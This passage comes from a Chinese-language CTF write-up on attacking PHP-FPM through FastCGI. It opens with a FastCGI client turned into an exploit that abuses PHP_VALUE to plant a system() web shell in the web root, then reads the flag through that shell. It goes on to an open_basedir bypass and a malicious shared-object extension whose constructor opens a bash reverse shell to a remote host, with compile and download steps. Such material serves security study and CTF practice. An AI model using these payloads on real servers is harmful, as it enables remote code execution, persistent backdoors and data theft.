class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Note : Code is released under the GNU LGPL</span><br><span class="line"> *</span><br><span class="line"> * Please do not change the header of this file</span><br><span class="line"> *</span><br><span class="line"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="line"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="line"> * the License, or (at your option) any later version.</span><br><span class="line"> *</span><br><span class="line"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="line"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"> *</span><br><span class="line"> * See the GNU Lesser General Public License for more details.</span><br><span class="line"> */</span><br><span class="line">/**</span><br><span class="line"> * Handles communication with a FastCGI application</span><br><span class="line"> *</span><br><span class="line"> * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;</span><br><span class="line"> * @version     1.0</span><br><span class="line"> */</span><br><span class="line">class FCGIClient</span><br><span class="line">&#123;</span><br><span class="line">    const VERSION_1            = 1;</span><br><span class="line">    const BEGIN_REQUEST        = 1;</span><br><span class="line">    const ABORT_REQUEST        = 2;</span><br><span class="line">    const END_REQUEST          = 3;</span><br><span class="line">    const PARAMS               = 4;</span><br><span class="line">    const STDIN                = 5;</span><br><span class="line">    const STDOUT               = 6;</span><br><span class="line">    const STDERR               = 7;</span><br><span class="line">    const DATA                 = 8;</span><br><span class="line">    const GET_VALUES           = 9;</span><br><span class="line">    const GET_VALUES_RESULT    = 10;</span><br><span class="line">    const UNKNOWN_TYPE         = 11;</span><br><span class="line">    const MAXTYPE              = self::UNKNOWN_TYPE;</span><br><span class="line">    const RESPONDER            = 1;</span><br><span class="line">    const AUTHORIZER           = 2;</span><br><span class="line">    const FILTER               = 3;</span><br><span class="line">    const REQUEST_COMPLETE     = 0;</span><br><span class="line">    const CANT_MPX_CONN        = 1;</span><br><span class="line">    const OVERLOADED           = 2;</span><br><span class="line">    const UNKNOWN_ROLE         = 3;</span><br><span class="line">    const MAX_CONNS            = &#x27;MAX_CONNS&#x27;;</span><br><span class="line">    const MAX_REQS             = &#x27;MAX_REQS&#x27;;</span><br><span class="line">    const MPXS_CONNS           = &#x27;MPXS_CONNS&#x27;;</span><br><span class="line">    const HEADER_LEN           = 8;</span><br><span class="line">    /**</span><br><span class="line">     * Socket</span><br><span class="line">     * @var Resource</span><br><span class="line">     */</span><br><span class="line">    private $_sock = null;</span><br><span class="line">    /**</span><br><span class="line">     * Host</span><br><span class="line">     * @var String</span><br><span class="line">     */</span><br><span class="line">    private $_host = null;</span><br><span class="line">    /**</span><br><span class="line">     * Port</span><br><span class="line">     * @var Integer</span><br><span class="line">     */</span><br><span class="line">    private $_port = null;</span><br><span class="line">    /**</span><br><span class="line">     * Keep Alive</span><br><span class="line">     * @var Boolean</span><br><span class="line">     */</span><br><span class="line">    private $_keepAlive = false;</span><br><span class="line">    /**</span><br><span class="line">     * Constructor</span><br><span class="line">     *</span><br><span class="line">     * @param String $host Host of the FastCGI application</span><br><span class="line">     * @param Integer $port Port of the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_host = $host;</span><br><span class="line">        $this-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="line">     * alive at the end of a request</span><br><span class="line">     *</span><br><span class="line">     * @param Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function setKeepAlive($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_keepAlive = (boolean)$b;</span><br><span class="line">        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span><br><span class="line">            fclose($this-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get the keep alive status</span><br><span class="line">     *</span><br><span class="line">     * @return Boolean true if the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function getKeepAlive()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Create a connection to the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    private function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        if (!$this-&gt;_sock) &#123;</span><br><span class="line">            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span><br><span class="line">            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);</span><br><span class="line">            if (!$this-&gt;_sock) &#123;</span><br><span class="line">                throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build a FastCGI packet</span><br><span class="line">     *</span><br><span class="line">     * @param Integer $type Type of the packet</span><br><span class="line">     * @param String $content Content of the packet</span><br><span class="line">     * @param Integer $requestId RequestId</span><br><span class="line">     */</span><br><span class="line">    private function buildPacket($type, $content, $requestId = 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        return chr(self::VERSION_1)         /* version */</span><br><span class="line">            . chr($type)                    /* type */</span><br><span class="line">            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */</span><br><span class="line">            . chr($requestId &amp; 0xFF)        /* requestIdB0 */</span><br><span class="line">            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */</span><br><span class="line">            . chr($clen &amp; 0xFF)             /* contentLengthB0 */</span><br><span class="line">            . chr(0)                        /* paddingLength */</span><br><span class="line">            . chr(0)                        /* reserved */</span><br><span class="line">            . $content;                     /* content */</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build an FastCGI Name value pair</span><br><span class="line">     *</span><br><span class="line">     * @param String $name Name</span><br><span class="line">     * @param String $value Value</span><br><span class="line">     * @return String FastCGI Name value pair</span><br><span class="line">     */</span><br><span class="line">    private function buildNvpair($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        if ($nlen &lt; 128) &#123;</span><br><span class="line">            /* nameLengthB0 */</span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($vlen &lt; 128) &#123;</span><br><span class="line">            /* valueLengthB0 */</span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);</span><br><span class="line">        &#125;</span><br><span class="line">        /* nameData &amp; valueData */</span><br><span class="line">        return $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a set of FastCGI Name value pairs</span><br><span class="line">     *</span><br><span class="line">     * @param String $data Data containing the set of FastCGI NVPair</span><br><span class="line">     * @return array of NVPair</span><br><span class="line">     */</span><br><span class="line">    private function readNvpair($data, $length = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $array = array();</span><br><span class="line">        if ($length === null) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = 0;</span><br><span class="line">        while ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            if ($nlen &gt;= 128) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            if ($vlen &gt;= 128) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        return $array;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Decode a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @param String $data String containing all the packet</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    private function decodePacketHeader($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = array();</span><br><span class="line">        $ret[&#x27;version&#x27;]       = ord($data&#123;0&#125;);</span><br><span class="line">        $ret[&#x27;type&#x27;]          = ord($data&#123;1&#125;);</span><br><span class="line">        $ret[&#x27;requestId&#x27;]     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);</span><br><span class="line">        $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);</span><br><span class="line">        $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;);</span><br><span class="line">        $ret[&#x27;reserved&#x27;]      = ord($data&#123;7&#125;);</span><br><span class="line">        return $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    private function readPacket()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = $this-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[&#x27;content&#x27;] = &#x27;&#x27;;</span><br><span class="line">            if ($resp[&#x27;contentLength&#x27;]) &#123;</span><br><span class="line">                $len  = $resp[&#x27;contentLength&#x27;];</span><br><span class="line">                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;</span><br><span class="line">                    $len -= strlen($buf);</span><br><span class="line">                    $resp[&#x27;content&#x27;] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if ($resp[&#x27;paddingLength&#x27;]) &#123;</span><br><span class="line">                $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $resp;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get Informations on the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $requestedInfo information to retrieve</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    public function getValues(array $requestedInfo)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">        $request = &#x27;&#x27;;</span><br><span class="line">        foreach ($requestedInfo as $info) &#123;</span><br><span class="line">            $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));</span><br><span class="line">        $resp = $this-&gt;readPacket();</span><br><span class="line">        if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123;</span><br><span class="line">            return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Execute a request to the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $params Array of parameters</span><br><span class="line">     * @param String $stdin Content</span><br><span class="line">     * @return String</span><br><span class="line">     */</span><br><span class="line">    public function request(array $params, $stdin)</span><br><span class="line">    &#123;</span><br><span class="line">        $response = &#x27;&#x27;;</span><br><span class="line">//        $this-&gt;connect();</span><br><span class="line">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));</span><br><span class="line">        $paramsRequest = &#x27;&#x27;;</span><br><span class="line">        foreach ($params as $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($paramsRequest) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;);</span><br><span class="line">        if ($stdin) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;);</span><br><span class="line">        //echo(&#x27;data=&#x27;.urlencode($request));</span><br><span class="line">		echo(base64_encode($request));            //因为数据放到fsockopen中是要进行base64解码的，我们直接在这里进行编码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$filepath = &quot;/var/www/html/index.php&quot;;</span><br><span class="line">//$filepath = &quot;/var/www/html/flag.php&quot;;          //调试用</span><br><span class="line">$req = &#x27;/&#x27; . basename($filepath);</span><br><span class="line">$uri = $req . &#x27;?&#x27; . &#x27;data=whoami&amp;host=&lt;%3fphp+system($_REQUEST[&quot;command&quot;])%3b%3f&gt;&amp;port=9000&#x27;;//payload,将这个报错数据写入error_log中，要url编码</span><br><span class="line">$client = new FCGIClient(&quot;1111&quot;, 0);</span><br><span class="line">$code = &quot;data[]=lastsward&quot;;          //flag.php的post数据，只是看phpinfo是否被修改</span><br><span class="line">$php_value = &quot;html_errors = Off\nerror_log = /var/www/html/3333.php&quot;;</span><br><span class="line">$params = array(</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;    =&gt; &#x27;POST&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;   =&gt; $filepath,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;       =&gt; $req,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;      =&gt; &#x27;data=whoami&amp;host=&lt;%3fphp+system($_REQUEST[&quot;command&quot;])%3b%3f&gt;&amp;port=9000&#x27;, //url编码后的</span><br><span class="line">    &#x27;REQUEST_URI&#x27;       =&gt; $uri,</span><br><span class="line">    &#x27;DOCUMENT_URI&#x27;      =&gt; $req,</span><br><span class="line">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span><br><span class="line">	&#x27;PHP_ADMIN_VALUE&#x27; =&gt; $php_value,</span><br><span class="line">    &#x27;PHP_VALUE&#x27;         =&gt; $php_value,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;   =&gt; &#x27;80sec/wofeiwo&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;       =&gt; &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;       =&gt; &#x27;9000&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;       =&gt; &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;       =&gt; &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;       =&gt; &#x27;localhost&#x27;,                  </span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;   =&gt; &#x27;HTTP/1.1&#x27;,</span><br><span class="line">    &#x27;CONTENT_LENGTH&#x27;    =&gt; strlen($code)，</span><br><span class="line">    &#x27;HTTP_HOST&#x27; =&gt; &#x27;127.0.0.1&#x27;,        //题目要求本地访问</span><br><span class="line">    &#x27;CONTENT_TYPE&#x27; =&gt; &quot;application/x-www-form-urlencoded&quot;,      //调试，表示$_POST有数据</span><br><span class="line">);</span><br><span class="line">echo $client-&gt;request($params, $code).&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>生成base64后访问即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">data=生成的base64编码&amp;host=127.0.0.1&amp;port=9000</span><br></pre></td></tr></table></figure>

<p>拿flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">http://xxxx/3333.php?command=cat+/flag.txt</span><br></pre></td></tr></table></figure>

<p>了解了之前的原理的话，这道题可以说是比较简单了。接下来我们看看同样是这个脚本的另外一种编写，通过对比完全掌握这个脚本的修改。</p>
<h1 id="Unix-Socket下的df绕过"><a href="#Unix-Socket下的df绕过" class="headerlink" title="Unix Socket下的df绕过"></a>Unix Socket下的df绕过</h1><p>以上我们的讨论都是基于TCP通信方式进行的。接下来讲讲unix socket。一般来说不能进行ssrf攻击，因为没有经过网络协议层，当然也有特例，引用了PHP-FPM监听的sock文件。</p>
<p>我们在渗透测试中常常会遇到目标环境设置了 disable_functions 的情况，<code>disable_functions</code> 这个选项是 PHP 加载的时候就确定了并且我们没有权限通过 <code>php_value</code> 选项对其进行修改，但是 LD_PRELOAD 绕过 disable_functions 的方法给了我们思路。即我们可以通过加载恶意 .so 扩展的方法实现系统命令的执行，从而一举绕过 disable_functions 对我们的限制。</p>
<p>有时候常见的攻击 PHP-FPM 的方法并不能成功实现代码执行，但我们可以通过加载恶意 .so 扩展的方法实现系统的命令执行。我们知道 LD_PRELOAD 绕过 disable_functions 大致就是把我们编译出来的恶意的 .so 文件加载到环境变量中去执行，从而实现执行系统命令。</p>
<p>LD_PRELOAD 是通过 putenv() 把so文件加载到环境变量中再去调用。那么我们 Fastcgi 也完全可以做同样的事，只需要通过 <code>PHP_VALUE</code> 给 php.ini 添加一个 extender 扩展就行了。</p>
<p>下面我们通过 [[2021 蓝帽杯]one_Pointer_php](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF">https://buuoj.cn/challenges#[蓝帽杯</a> 2021]One Pointer PHP) 这道 CTF 例题来演示攻击过程。</p>
<p>该可以通过 PHP 数组溢出绕过限制实现 eval() 任意代码执行，但是题目的PHP环境还设置了以下两个限制：</p>
<ul>
<li>disable_functions：</li>
</ul>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220925123927903.png" alt="image-20220925123927903"></p>
<p>过滤了各种命令执行函数，但是像 scandir、file_get_contents、file_put_contents 等目录和文件操作函数没有被过滤</p>
<ul>
<li><p>open_basedir</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220925123949074.png" alt="image-20220925123949074"></p>
</li>
</ul>
<p>设置了 open_basedir，只能访问 Web 目录，但我们可以利用chdir()与ini_set()组合来绕过 open_basedir：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">/add_api.php?backdoor=mkdir(&#x27;css&#x27;);chdir(&#x27;css&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<p>在根目录里发现了 flag。</p>
<p>尝试使用 file_get_contents() 等函数读取均失败，猜测是出题人对flag的权限做了限制。那我们就要想办法提权了，但是要提权则必须先拿到shell执行命令，也就是得要先绕过disable_functions。</p>
<p>这里尝试了很多方法绕过disable_functions均失败，当我读取 &#x2F;proc&#x2F;self&#x2F;cmdline 时发现当前进程是 php-fpm。发现 PHP-FPM 绑定在了本地 9001 端口上。</p>
<p>既然我们可以通过 eval() 执行任意代码，那我们便可以构造恶意代码进行 SSRF，利用 SSRF 攻击本地的 PHP-FPM。我们可以通过在vps上搭建恶意的ftp，骗取目标主机将 payload 转发到自己的 9001 端口上，从而实现攻击 PHP-FPM 并执行命令，原理上文已经讲过了。</p>
<p>首先使用以下c文件 hpdoger.c 编译一个恶意的 .so 扩展，这里直接用网上亘古不变的写法：</p>
<h4 id="构造恶意-so"><a href="#构造恶意-so" class="headerlink" title="构造恶意.so"></a>构造恶意.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)&#123;</span><br><span class="line">    system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&#x27;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 shared 命令编译：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure>

<p>然后将生成的 hpdoger.so 上传到目标主机（我这里上传到 &#x2F;tmp 目录,放在tmp是因为普适性比较强。可以使用 <code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code> ）</p>
<h4 id="Exp编写"><a href="#Exp编写" class="headerlink" title="Exp编写"></a>Exp编写</h4><p>然后简单修改以下脚本（根据 <a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">fcgi_jailbreak.php</a> 改的）并执行，生成 payload：</p>
